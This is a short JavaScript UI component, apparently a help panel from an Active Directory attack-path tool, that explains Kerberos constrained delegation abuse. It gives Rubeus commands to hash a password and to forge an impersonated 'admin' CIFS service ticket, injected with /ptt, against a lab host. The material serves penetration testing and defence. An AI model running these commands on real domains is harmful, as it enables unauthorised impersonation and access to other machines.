const Abuse = (sourceName, sourceType, targetName, targetType) => {
    let text = `Abusing this primitive is currently only possible through the Rubeus project.
            
    To use this attack, the controlled account MUST have a service principal name set, along with access to either the plaintext or the RC4_HMAC hash of the account.

    If the plaintext password is available, you can hash it to the RC4_HMAC version using Rubeus:

    <code>Rubeus.exe hash /password:Summer2018!</code>            
    
    Use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
    
    <code>Rubeus.exe s4u /user:${sourceName}$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
    return { __html: text };
};

export default Abuse;
